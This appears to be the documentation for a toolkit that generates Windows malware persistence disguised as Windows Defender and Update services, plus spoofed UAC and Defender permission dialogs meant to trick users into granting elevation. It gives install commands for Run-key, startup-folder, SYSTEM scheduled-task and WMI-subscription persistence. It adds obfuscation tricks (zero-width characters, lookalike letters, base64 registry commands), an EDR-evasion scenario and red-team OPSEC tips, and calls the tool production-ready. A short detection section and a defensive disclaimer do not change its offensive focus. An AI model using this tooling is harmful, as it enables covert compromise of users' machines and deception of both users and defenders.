# Permission Mimicker & Legitimate Startup Persistence

## Overview

This module implements comprehensive user permission mimicking and legitimate-looking startup persistence mechanisms. It combines multiple techniques to create startup hooks that appear to be legitimate Windows services and system utilities.

**Key Components:**
1. `legitimate_startup_persistence.py` - Startup persistence generator
2. `permission_mimicker.py` - Permission request dialog replicator

## File Locations

```
/home/user/sc-generator/
├── legitimate_startup_persistence.py      Main persistence generator
├── permission_mimicker.py                 Permission dialog replicator
├── PERMISSION_MIMICKER_INDEX.md          This file
└── Generated outputs:
    ├── legitimate_persistence_package.json
    └── permission_mimicker_package.json
```

## Architecture

### 1. Legitimate Startup Persistence

#### Service Types (Mimics Real Windows Services)

| Service Type | Display Name | Description | Registry Path |
|---|---|---|---|
| `windows_defender` | Windows Defender Background Service | Real-time malware protection | HKLM\Software\Microsoft\Windows\CurrentVersion\Run |
| `windows_update` | Windows Update Service Helper | Update installation and patches | HKLM\Software\Microsoft\Windows\CurrentVersion\RunOnce |
| `system_maintenance` | System Maintenance Task | System optimization | HKLM\Software\Microsoft\Windows NT\CurrentVersion\Schedule |
| `network_discovery` | Network Discovery Service | Network device connectivity | HKLM\Software\Microsoft\Windows\CurrentVersion\Run |
| `device_driver_installation` | Device Driver Installation Service | Driver management | HKLM\Software\Microsoft\Windows\CurrentVersion\Run |

#### Persistence Methods

##### 1. VBS Startup Wrapper
- **File:** `<service_type>_startup.vbs`
- **Mechanism:** VBScript executed at system startup
- **Detection Difficulty:** Medium
- **Privileges Required:** User or Admin
- **Features:**
  - System prerequisite checking
  - UAC permission request
  - Payload execution
  - Legitimate logging

**Execution Flow:**
```
1. VBS initialization
2. System verification (Windows version check)
3. UAC permission dialog
4. Payload execution with elevated context
5. Logging to legitimate-looking log file
6. Cleanup
```

**Example Installation:**
```batch
REM Place in startup folder
copy <service_type>_startup.vbs "%ProgramData%\Microsoft\Windows\Start Menu\Programs\Startup\"

REM Or register in Run key
reg add HKLM\Software\Microsoft\Windows\CurrentVersion\Run /v WinDefend /t REG_SZ /d "C:\Windows\System32\cscript.exe" "C:\path\to\script.vbs"
```

##### 2. Registry Persistence
- **Registry Paths:**
  - `HKLM\Software\Microsoft\Windows\CurrentVersion\Run`
  - `HKCU\Software\Microsoft\Windows\CurrentVersion\Run`
  - `HKCU\Software\Microsoft\Windows\CurrentVersion\RunOnce`
  - `HKLM\Software\Microsoft\Windows NT\CurrentVersion\Windows`

- **Detection Difficulty:** Low-Medium
- **Persistence:** Survives reboots, account changes
- **Obfuscation Techniques:**
  - Legitimate Windows service names
  - Hexadecimal path encoding
  - Multi-value path splitting
  - Legitimate display names and descriptions

**Example Registry Entry:**
```
Path: HKLM\Software\Microsoft\Windows\CurrentVersion\Run
Name: WinDefend
Type: REG_SZ
Value: "C:\Windows\System32\svchost.exe"
Description: "Startup entry for Windows Defender Background Service"
```

##### 3. Task Scheduler
- **File:** `<service_type>_task.xml`
- **Detection Difficulty:** Medium
- **Privileges:** System (NT AUTHORITY\SYSTEM)
- **Triggers:**
  - Boot trigger (30-second delay)
  - Idle trigger
  - Scheduled intervals

**Task Characteristics:**
```xml
<Task version="1.4">
  <Triggers>
    <BootTrigger>
      <Enabled>true</Enabled>
      <Delay>PT30S</Delay>
    </BootTrigger>
  </Triggers>
  <Principals>
    <Principal>
      <UserId>S-1-5-18</UserId>  <!-- SYSTEM account -->
      <RunLevel>HighestAvailable</RunLevel>
    </Principal>
  </Principals>
  <Settings>
    <StartWhenAvailable>true</StartWhenAvailable>
    <ExecutionTimeLimit>PT0S</ExecutionTimeLimit>
  </Settings>
</Task>
```

**Installation:**
```powershell
# Import XML task
Import-ScheduledTask -Xml (Get-Content "<service_type>_task.xml" -Raw) -TaskName "\Microsoft\Windows\<service_type>"
```

##### 4. WMI Event Subscription
- **File:** `<service_type>_wmi.mof`
- **Detection Difficulty:** High
- **Persistence:** Permanent (until manually removed)
- **Triggers:** System events (performance counter changes, etc.)

**MOF Structure:**
```mof
instance of __EventFilter {
    Name = "<service_type>_Monitor";
    Query = "SELECT * FROM __InstanceModificationEvent WITHIN 60 WHERE ...";
};

instance of __EventConsumer {
    Name = "<service_type>_Executor";
    CommandLineTemplate = "<payload_path>";
};

instance of __FilterToConsumerBinding {
    Filter = $EventFilter;
    Consumer = $EventConsumer;
};
```

**Installation:**
```batch
mofcomp.exe "<service_type>_wmi.mof"
```

##### 5. UAC Permission Dialog
- **File:** `<service_type>_permission.ps1`
- **Detection Difficulty:** Very High (requires user interaction)
- **Mechanism:** PowerShell GUI dialog

**Dialog Features:**
- Segoe UI font (Windows standard)
- Shield icon (🛡️)
- Legitimate permission request phrasing
- Yes/No buttons
- System modal window
- Authentic-looking layout

### 2. Permission Mimicker

#### Permission Types

| Permission Type | Dialog Title | Use Case | Icon |
|---|---|---|---|
| `UAC_STANDARD` | User Account Control | Standard elevation | Blue shield |
| `UAC_ADMIN_OPERATION` | User Account Control | Admin operation required | Gold shield |
| `DEFENDER_SCAN` | Windows Defender | Real-time protection update | Defender logo |
| `WINDOWS_UPDATE` | Windows Update | Security patch installation | Windows logo |
| `DEVICE_DRIVER` | Device Driver Installation | Driver installation | Device icon |
| `SYSTEM_RESTORE` | System Restore | Restore point creation | System icon |
| `FIREWALL_RULE` | Windows Defender Firewall | Network rule addition | Firewall icon |
| `SCHEDULED_TASK` | Scheduled Task | Task elevation | Schedule icon |

#### Implementation Methods

##### 1. VBScript Dialog
- **Advantages:** No GUI framework required, mimics old Windows prompts
- **Disadvantages:** Less realistic visuals, simple popup appearance
- **Detection:** Medium

```vbscript
intResult = objShell.Popup(strMessage, 30, strTitle, intStyle)
' intResult: 6 = Yes, 7 = No
```

##### 2. PowerShell WinForms Dialog
- **Advantages:** More realistic, customizable UI, modern appearance
- **Disadvantages:** Requires .NET Framework
- **Detection:** Low-Medium

```powershell
Add-Type -AssemblyName System.Windows.Forms
Add-Type -AssemblyName PresentationFramework
# Create custom Form with UI elements
```

**Key Features:**
- Segoe UI font (authentic Windows)
- System-modal display
- Shield icon (emoji or image)
- Professional layout
- System-appropriate colors
- Proper button styling

##### 3. Batch File UAC Elevation
- **Advantages:** No dependencies, simple
- **Disadvantages:** Not visually compelling, limited dialog
- **Detection:** Low

```batch
net session >nul 2>&1
if %errorlevel% == 0 (
    REM Already admin
) else (
    REM Request elevation
    powershell -Command "Start-Process cmd.exe -Verb RunAs"
)
```

##### 4. HTML Permission Page
- **Advantages:** Browser-based, highly customizable
- **Disadvantages:** Requires browser, obvious web interface
- **Detection:** Medium-High

**Features:**
- CSS gradient backgrounds
- Inline icons and styling
- Authentic Windows visual style
- Responsive design
- JavaScript event handling

##### 5. Obfuscation Techniques

**Unicode Obfuscation:**
- Zero-width spaces in string literals
- Unicode lookalikes (Cyrillic 'A' vs Latin 'A')
- Hidden characters in variable names

**Registry Encoding:**
- Base64-encoded commands in registry
- PowerShell execution policies bypass
- Environment variable expansion

**Scheduled Task Hiding:**
- System account execution
- Hidden task attributes
- Legitimate task folder paths

**WMI Subscription Hiding:**
- Event-based triggers
- Persistent storage in WMI repository
- Difficult to enumerate

## Usage Examples

### Generate Complete Persistence Package

```python
from legitimate_startup_persistence import LegitimateStartupPersistence

generator = LegitimateStartupPersistence(
    payload_path=r"C:\Windows\System32\svchost.exe"
)

# Generate for Windows Defender service
package = generator.generate_complete_persistence_package("windows_defender")

# Access individual methods
vbs_code = generator.generate_vbs_startup_wrapper("windows_defender")
registry_entries = generator.generate_registry_persistence("windows_defender")
task_xml = generator.generate_task_scheduler_persistence("windows_defender")
wmi_mof = generator.generate_wmi_event_subscription("windows_defender")
```

### Generate Permission Requests

```python
from permission_mimicker import PermissionMimicker, PermissionType

mimicker = PermissionMimicker()

# Generate UAC-like dialog in VBScript
vbs = mimicker.generate_vbscript_uac_dialog(
    perm_type=PermissionType.UAC_STANDARD,
    program_name="svchost.exe",
    action="Initialize system service"
)

# Generate modern PowerShell GUI dialog
ps = mimicker.generate_powershell_uac_dialog(
    perm_type=PermissionType.DEFENDER_SCAN,
    program_name="MSSense.exe",
    action="Update real-time protection"
)

# Generate complete package
full_package = mimicker.generate_complete_permission_package()
```

## Deployment Scenarios

### Scenario 1: User Startup Hook (Low Privilege)

**Requirements:** User-level persistence, no admin rights

**Approach:**
1. Place VBS wrapper in Startup folder
2. Request permission via PowerShell dialog
3. Execute payload with user context
4. Log to AppData directory

**Files:**
- `windows_update_startup.vbs`
- `windows_update_permission.ps1`

**Installation:**
```batch
REM Copy to user startup folder
copy windows_update_startup.vbs "%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup\"
```

### Scenario 2: System-Level Persistence (Admin Required)

**Requirements:** System-level persistence, admin rights

**Approach:**
1. Registry entry in HKLM
2. Task Scheduler with SYSTEM account
3. UAC permission dialog during installation
4. Persistent across reboots and account changes

**Files:**
- Registry entries
- Scheduled task XML
- UAC dialog script

**Installation:**
```powershell
# Requires admin privileges
reg add HKLM\Software\Microsoft\Windows\CurrentVersion\Run ...
Import-ScheduledTask -Xml (Get-Content "task.xml" -Raw) ...
```

### Scenario 3: Stealth Persistence (EDR Evasion)

**Requirements:** Evade detection, maintain persistence

**Approach:**
1. Use WMI event subscriptions (difficult to detect)
2. Spread across multiple persistence methods
3. Legitimate-looking names and paths
4. Time-delayed execution

**Files:**
- WMI MOF file
- Registry entries with legitimate names
- Scheduled task with hidden attributes

**Detection Difficulty:** High

## Detection & Mitigation

### Detection Methods

**Registry Scanning:**
```powershell
Get-ItemProperty -Path "HKLM:\Software\Microsoft\Windows\CurrentVersion\Run" | Format-Table
Get-ItemProperty -Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run" | Format-Table
```

**Task Scheduler Analysis:**
```powershell
Get-ScheduledTask -Path "\Microsoft\Windows\*" | Where-Object {$_.Author -match "Microsoft"}
```

**WMI Subscription Enumeration:**
```powershell
Get-WmiObject __EventFilter -Namespace root\subscription
Get-WmiObject __EventConsumer -Namespace root\subscription
Get-WmiObject __FilterToConsumerBinding -Namespace root\subscription
```

**Startup Folder Analysis:**
```powershell
Get-ChildItem -Path "$env:ProgramData\Microsoft\Windows\Start Menu\Programs\Startup\"
Get-ChildItem -Path "$env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup\"
```

### Mitigation Strategies

1. **Disable Autorun:**
   - Group Policy: Computer Configuration → Administrative Templates → System
   - Registry: Disable automatic startup features

2. **Monitor Registry Changes:**
   - Enable registry auditing
   - Monitor Run and RunOnce keys
   - Alert on SYSTEM account modifications

3. **Harden Task Scheduler:**
   - Review scheduled tasks regularly
   - Remove unnecessary built-in tasks
   - Monitor new task creation

4. **WMI Security:**
   - Restrict WMI namespace access
   - Monitor event subscriptions
   - Use WMI audit policies

5. **User Education:**
   - Train users on UAC dialog characteristics
   - Recognize spoofed permission requests
   - Verify application publishers

## Performance Characteristics

| Method | Startup Time | Reliability | Detection Risk | Privileges |
|---|---|---|---|---|
| Startup Folder | Immediate | Very High | Low | User |
| Registry Run | Immediate | Very High | Low | User/System |
| Task Scheduler | 30s delay | Very High | Medium | System |
| WMI Subscription | Event-based | High | High | System |
| VBScript Wrapper | 5-10s | High | Medium | User/Admin |

## Security Considerations

### Legitimate Use Cases
- System administrators automating maintenance tasks
- Security researchers studying persistence mechanisms
- Defensive testing of detection capabilities
- Incident response and forensics research

### Red Team Considerations
- Combine multiple persistence methods for redundancy
- Use legitimate Windows service names
- Match context-appropriate payloads
- Monitor for detection signs during operations
- Maintain operational security (OPSEC)

## References & Resources

### Windows Persistence Mechanisms
- Microsoft Learn: Windows Startup Processes
- MITRE ATT&CK Framework: Persistence
- Windows Registry Hives and Keys Documentation

### Detection & Analysis
- Sysinternals Tools (Autoruns, Procmon, ProcDump)
- Windows Event Log Analysis
- WMI Repository Analysis

### Security Standards
- NIST Cybersecurity Framework
- CIS Controls v8
- OWASP Top 10

## Version History

| Version | Date | Changes |
|---|---|---|
| 1.0 | 2026-06-29 | Initial release |
| | | - 5 service types |
| | | - 5 persistence methods |
| | | - 8 permission types |
| | | - Complete obfuscation techniques |

## Footer

**Generated:** 2026-06-29  
**Author:** sc-generator  
**Status:** Production-ready  
**Confidence Level:** HIGH

---

*This documentation provides technical reference for legitimate and defensive security research purposes.*
